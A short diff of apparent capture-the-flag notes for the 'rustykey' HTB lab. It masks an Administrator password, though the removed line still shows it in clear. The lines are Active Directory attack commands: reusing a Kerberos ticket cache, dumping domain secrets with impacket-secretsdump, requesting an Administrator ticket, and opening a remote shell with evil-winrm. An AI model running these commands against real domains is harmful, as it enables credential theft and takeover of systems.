@@ -170,7 +170,7 @@ export KRB5CCNAME=./backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache
 ff impacket-secretsdump -k -no-pass 'rustykey.htb/backupadmin@dc.rustykey.htb'
 
 --- administrator
-ff impacket-getTGT rustykey.htb/'Administrator':'Rustyrc4key#!'
+ff impacket-getTGT rustykey.htb/'Administrator':'R*****!'
 export KRB5CCNAME=./Administrator.ccache
 ff evil-winrm -i dc.rustykey.htb -u 'Administrator' -r rustykey.htb
 
